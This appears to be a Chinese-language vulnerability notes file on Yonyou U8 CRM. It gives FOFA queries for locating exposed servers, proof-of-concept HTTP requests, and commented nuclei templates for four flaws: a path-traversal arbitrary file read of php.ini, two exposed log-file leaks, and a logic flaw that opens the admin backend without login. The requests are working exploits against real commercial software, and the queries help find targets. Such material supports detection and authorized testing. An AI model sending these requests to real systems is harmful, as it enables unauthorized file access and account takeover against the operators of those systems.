## 用友 CRM help2 任意文件读取

#### fofa

> app="用友-U8CRM"

#### poc

```http
GET /pub/help2.php?key=../../apache/php.ini HTTP/1.1
Host:
```

#### nuclei

```yaml
id: YonyouCRM-help2-arbitrary-file-read
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: YonyouCRM help2 arbitrary file read - Detect
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 1
  tags: YonyouCRM,Yonyou
  # 标签，可以通过标签进行扫描

http:
# http 请求
  - method: GET
    # 请求方法
    # redirects: true
    # 允许重定向 默认不执行重定向
    path:
      - "{{BaseURL}}/pub/help2.php?key=../../apache/php.ini"
      # {{BaseURL}} 使用请求中的 URL 内容

    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则
      - type: word
        # 字符串匹配
        part: body
        # 对响应 body 进行字符串匹配
        words:
          - "About php.ini"
        condition: or
        # 当匹配到某个单词时，该请求被标记为成功

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---

## 用友 CRM solr 信息泄露

#### fofa

> app="用友-U8CRM"

#### poc

```http
GET /datacache/solr.log HTTP/1.1
Host: 
```

#### nuclei

```yaml
id: YonyouCRM-solr-info-leak
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: YonyouCRM solr info leak - Detect
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 1
  tags: YonyouCRM,Yonyou
  # 标签，可以通过标签进行扫描

http:
# http 请求
  - method: GET
    # 请求方法
    # redirects: true
    # 允许重定向 默认不执行重定向
    path:
      - "{{BaseURL}}/datacache/solr.log"
      # {{BaseURL}} 使用请求中的 URL 内容

    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则
      - type: word
        # 字符串匹配
        part: body
        # 对响应 body 进行字符串匹配
        words:
          - "Solr Index Req:"
        condition: or
        # 当匹配到某个单词时，该请求被标记为成功

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---

## 用友 CRM crmdebug 信息泄露

#### fofa

> app="用友-U8CRM"

#### poc

```http
GET /datacache/crmdebug.log HTTP/1.1
Host: 
```

#### nuclei

```yaml
id: YonyouCRM-crmdebug-info-leak
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: YonyouCRM crmdebug info leak - Detect
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 1
  tags: YonyouCRM,Yonyou
  # 标签，可以通过标签进行扫描

http:
# http 请求
  - method: GET
    # 请求方法
    # redirects: true
    # 允许重定向 默认不执行重定向
    path:
      - "{{BaseURL}}/datacache/crmdebug.log"
      # {{BaseURL}} 使用请求中的 URL 内容

    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则
      - type: word
        # 字符串匹配
        part: header
        # 对响应 header 进行字符串匹配
        words:
          - "Content-Type: text/plain"
        condition: or
        # 当匹配到某个单词时，该请求被标记为成功

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---

## 用友 CRM 逻辑漏洞直接登录后台

#### fofa

> app="用友-U8CRM"

#### poc

访问 poc，页面返回空白

```http
GET /background/reservationcomplete.php?ID=1 HTTP/1.1
Host: 
```

再次访问 host 就会直接进入后台

#### nuclei

```yaml
id: YonyouCRM-login-background
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: 用友 CRM 逻辑漏洞直接登录后台
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 2
  tags: YonyouCRM,Yonyou
  # 标签，可以通过标签进行扫描

http:
# http 请求
  - method: GET
    # 请求方法
    # redirects: true
    # 允许重定向 默认不执行重定向
    path:
      - "{{BaseURL}}/background/reservationcomplete.php?ID=1"
      - "{{BaseURL}}/"
      # {{BaseURL}} 使用请求中的 URL 内容

    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则
      - type: word
        # 字符串匹配
        part: body
        # 对响应 body 进行字符串匹配
        words:
          - "{\"msg\": \"bgsesstimeout-\", \"serverName\" : \""
        condition: or
        # 当匹配到某个单词时，该请求被标记为成功

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---